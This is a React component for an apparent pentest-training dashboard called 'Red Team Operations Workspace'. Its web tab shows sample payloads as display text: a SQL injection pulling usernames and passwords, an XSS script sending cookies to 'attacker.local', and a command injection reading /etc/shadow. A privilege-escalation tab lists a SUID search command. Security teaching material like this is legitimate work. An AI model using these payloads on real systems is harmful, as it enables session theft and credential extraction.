"use client";

import { useState } from "react";
import { Crosshair, Shield, Terminal, Zap, ExternalLink, Play } from "lucide-react";

export default function RedTeamPage() {
  const [activeTab, setActiveTab] = useState<"web" | "ad" | "privesc">("web");

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-extrabold text-white flex items-center gap-2">
            <Crosshair className="w-6 h-6 text-cyber-red" />
            Red Team Operations Workspace
          </h1>
          <p className="text-xs text-cyber-muted font-mono">
            Module 15 • Offensive Pentesting Suite: Web Exploitation, Active Directory Graph & Privilege Escalation Labs
          </p>
        </div>
      </div>

      {/* Navigation */}
      <div className="flex gap-2 border-b border-cyber-border pb-3">
        {[
          { id: "web", label: "Web Application Pentesting" },
          { id: "ad", label: "Active Directory Domain Attack Graph" },
          { id: "privesc", label: "Privilege Escalation Guides" },
        ].map((t) => (
          <button
            key={t.id}
            onClick={() => setActiveTab(t.id as any)}
            className={`px-4 py-2 text-xs font-mono rounded-lg transition-all ${
              activeTab === t.id
                ? "bg-cyber-red/20 text-cyber-red border border-cyber-red/40 shadow-lg"
                : "text-cyber-muted hover:text-white bg-slate-900"
            }`}
          >
            {t.label}
          </button>
        ))}
      </div>

      {/* Content View */}
      {activeTab === "web" && (
        <div className="glass-panel p-6 rounded-2xl border border-cyber-border space-y-4">
          <h3 className="text-sm font-bold text-white font-mono">PAYLOAD GENERATOR & PENETRATION TESTING MODULES</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="p-4 rounded-xl bg-slate-950 border border-cyber-border">
              <span className="text-xs font-bold text-cyber-cyan block mb-2 font-mono">SQL Injection Payloads</span>
              <code className="text-[11px] text-cyber-red font-mono block bg-slate-900 p-2 rounded">
                ' UNION SELECT null, username, password FROM users--
              </code>
            </div>
            <div className="p-4 rounded-xl bg-slate-950 border border-cyber-border">
              <span className="text-xs font-bold text-cyber-purple block mb-2 font-mono">Cross-Site Scripting (XSS)</span>
              <code className="text-[11px] text-cyber-red font-mono block bg-slate-900 p-2 rounded">
                &lt;script&gt;fetch('http://attacker.local/steal?c='+document.cookie)&lt;/script&gt;
              </code>
            </div>
            <div className="p-4 rounded-xl bg-slate-950 border border-cyber-border">
              <span className="text-xs font-bold text-amber-400 block mb-2 font-mono">Command Injection</span>
              <code className="text-[11px] text-cyber-red font-mono block bg-slate-900 p-2 rounded">
                127.0.0.1; cat /etc/shadow
              </code>
            </div>
          </div>
        </div>
      )}

      {activeTab === "ad" && (
        <div className="glass-panel p-6 rounded-2xl border border-cyber-border space-y-4 text-center min-h-[300px] flex flex-col items-center justify-center">
          <Shield className="w-12 h-12 text-cyber-red mb-2" />
          <h3 className="text-base font-bold text-white font-mono">ACTIVE DIRECTORY ATTACK GRAPH VISUALIZER</h3>
          <p className="text-xs text-cyber-muted max-w-md">
            BloodHound-style node analyzer for domain trust paths, Kerberoasting targets, and Domain Admin path traversal.
          </p>
        </div>
      )}

      {activeTab === "privesc" && (
        <div className="glass-panel p-6 rounded-2xl border border-cyber-border space-y-3 font-mono text-xs">
          <h3 className="text-sm font-bold text-white mb-2">LINUX PRIVILEGE ESCALATION CHEAT SHEET</h3>
          <p className="text-cyber-cyan">Find SUID binaries:</p>
          <code className="block bg-slate-950 p-3 rounded border border-cyber-border text-cyber-red">
            find / -perm -u=s -type f 2&gt;/dev/null
          </code>
        </div>
      )}
    </div>
  );
}
